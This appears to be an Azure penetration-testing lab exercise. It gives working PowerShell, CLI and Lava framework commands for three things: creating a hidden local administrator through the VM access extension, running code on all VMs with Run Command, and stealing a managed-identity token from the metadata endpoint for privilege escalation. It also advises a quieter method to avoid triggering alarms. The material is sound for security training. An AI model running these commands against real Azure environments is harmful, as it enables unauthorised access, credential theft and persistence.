

## Task 1 â€“ Exploiting the password reset feature to create a local administrative user
In this exercise, we will exploit the password reset feature for Azure VMs to create a local administrative user that can be used to connect to the VM, where we will hunt for credentials on it. 

1. In a PowerShell console on your pentest VM, use the following commands to authenticate to Entra ID (Azure AD) and Azure as the **`Ava`**. Replace the **`USERNAME`** and **`PASSWORD`** placeholders with the real values of Ava's credentials from the **`LABXX-Info`** exercise file.

```
$username = "USERNAME"
$password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Connect-AzAccount -Credential $cred
Connect-AzureAD -Credential $cred
```

2. Obtain a list of VMs in the subscription using the following command:
```
Get-AzVM
```

3. Create a new local user on the winvm01 VM using the following command:
```
Set-AzVMAccessExtension -ResourceGroupName "PENTEST-RG" -VMName "winvm01" -Credential (get-credential) -typeHandlerVersion "2.0" -Name VMAccessAgent
```

4. When prompted, enter **`pentestuser`** as the username and **`AzPentestCourse2023!`** as the password, then click **`OK`**.
* This creates a new user account that does not exist on the VM. It only requires the **`runCommand`** permission.

5. Obtain the public IP of **`winvm01`** with the following command:
* Remember that if a VM does not have a public IP or the RDP port is not open, you can always use the Contributor role permissions to expose the service on a public IP. This is a major state change in most environments and increases risk, so it is not recommended for most environments.
```
Get-AzPublicIpAddress -Name winvm01* | Select IpAddress
```

6. Connect to the public IP over RDP and authenticate using the username **`pentestuser`** and the password **`AzPentestCourse2023!`**. Congratulations! You have successfully created a local administrator user on the VM.

**NOTE**: This is a very handy feature, but it's not always the most appropriate tool to use during an assessment. Let's say that we want to be a little more covert in our actions during a test. Creating a new local administrator user on a system might trigger some alarms. As an alternative, we can use native Azure functionality to run commands directly on VMs, without the need for an additional account.

### Task 2 - Exploiting the Run Command feature

1. Get all running Windows VMs in the sunscription into a variable using the following command:
```
$VMs = Get-AzVM -Status | where {($_.PowerState -EQ "VM running") -and ($_.StorageProfile.OSDisk.OSType -eq "Windows")}

$VMs | select ResourceGroupName,Name
```

2. Enter the **`whoami`** command into a PowerShell (ps1) file first:
```
echo "whoami" > whoami.ps1
```

3. To execute commands, we will need to pass in the resource group and the name of the VM that we are running the commands on. Thanks to the magic of the PowerShell pipeline, we can pass the VMs variable to the Invoke-AzRunCommand function, along with the local script. NOTE that this could take a long time to complete and have been known to hand at times. We recommend opening a new PowerShell window and proceeding to the next task.
```
$VMs | Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1
```

4. While this approach is fine for our sample environment, this will attempt to run your PowerShell script on all VMs in the subscription. You may want to focus on individual VMs for command execution during a normal Azure penetration test. This can be done by specifying individual VMs and resource groups, or by using the indices of the VMs variable that we created earlier. 


### Task 3 - Leveraging Lava for remote code execution
* Lava is a Python-based Microsoft Azure exploitation framework. It has multiple built-in modules that can be used to exploit various misconfigurations in Azure. 

1. Open a PowerShell console on your pentest VM. SSH into the Linux VM specified in your **`LABXX-Info`** exercise file. Enter the password when prompted.
```
ssh linuxadmin@linuxvm-xxxxxxxxxxxxxxxxxxxxxx
```

2. Authenticate to Azure CLI using the following command. Replace the **`AVA_USERNAME`** and **`AVA_PASSWORD`** placeholders with the real values of Ava's credentials from the **`LABXX-Info`** exercise file:
```
az login --username "AVA_USERNAME" --password "AVA_PASSWORD"
```

3. Download Lava using the following command:
```
git clone https://github.com/mattrotlevi/lava.git
```

4. Switch to the Lava directory and run it using the following commands:
```
cd lava/
python3 lava.py
```

5. In the Lava console, confirm the authenticated user using the **`whoami`** command:
```
whoami
```
6. List all the modules in Lava using the following command:
```
ls
```

7. Lava has a lot of modules that can be used to exploit resources in different scenarios but in this task, we will be using two main modules: **`vm_list_privileged`** and **`vm_rce`**. Use the **`vm_list_privileged`** module to check whether any VM in the subscription is associated with a privileged managed identity. To execute a module in Lava, the command needs to be preceded by the exec keyword:
```
exec vm_list_privileged
```

8. You can see from the output that the module found some VMs with privileged access. Use the **`vm_rce`** module to exploit the Run Command functionality for code execution. You will need to specify the VM name and resource group as shown here:

```
exec vm_rce -rgrp PENTEST-RG -vm_name LinuxVM
```

9. In the shell, run the following command to obtain an access token for the resource manager. This will obtain an access token that can be used to make API calls with the  privileges of the resource:
```
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true
```

10. Highlight and copy only the value of the access token. Make sure you do not copy the trailing comma. Paste it in a notepad document. Type **`exit`** and press **`Enter`** to return to the Lava console. Type **`exit`** again and press **`Enter`** to return to the Bash shell in Linux. 

Congratulations! You have successfully exploited the Run Command functionality to execute code on an Azure resource and obtain an access token that can be used to make API calls with the privileges of the resource. This is a very powerful attack vector that can be used to escalate privileges in Azure.